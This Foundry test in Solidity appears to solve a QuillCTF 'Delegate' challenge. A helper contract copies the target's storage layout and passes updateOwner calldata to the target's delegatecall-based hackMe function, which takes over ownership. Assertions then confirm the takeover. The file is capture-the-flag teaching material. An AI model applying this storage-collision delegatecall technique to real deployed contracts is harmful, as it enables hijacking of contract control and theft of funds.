// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/QuillCTF/Delegate.sol';
import '@forge-std/Test.sol';
import '@forge-std/console.sol';

interface IDelegate {
  function hackMe(bytes calldata bites) external returns (bool, bytes memory);
}

contract Helper {
  uint256 a = 12345;
  uint8 b = 32;
  string private d;
  uint32 private c;
  string private mot;
  address public owner;
  mapping(address => bool) public canYouHackMe;

  function exploit(address _target, address _newOwner) public {
    bytes memory fnSignature = abi.encodeWithSignature(
      'updateOwner(address)',
      _newOwner
    );
    IDelegate(_target).hackMe(fnSignature);
  }

  function updateOwner(address _newOwner) public {
    console.log('Update the owner and hack the contract');
    owner = _newOwner;
    canYouHackMe[_newOwner] = true;
  }
}

contract DelegateExploit is Test {
  Delegate target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new Delegate();
    console.log('Target contract deployed');
    vm.stopPrank();
  }

  function testExploit() public {
    vm.startPrank(exploiter);
    // Check that the contract is not hacked
    getStats();
    assertEq(target.owner(), deployer);
    assertEq(target.canYouHackMe(exploiter), false);

    // Deploy the helper contract
    Helper helper = new Helper();
    console.log('Helper contract deployed');
    console.log('Run the exploit');
    helper.exploit(address(target), exploiter);

    // Check that the contract is hacked
    getStats();
    assertEq(target.owner(), exploiter);
    assertEq(target.canYouHackMe(exploiter), true);

    vm.stopPrank();
  }

  function getStats() public view {
    console.log('\n  --------------- [STATS] ----------------');
    console.log('Owner: %s', target.owner());
    console.log('Contract is hacked: %s', target.canYouHackMe(exploiter));
    console.log('----------------------------------------\n');
  }
}
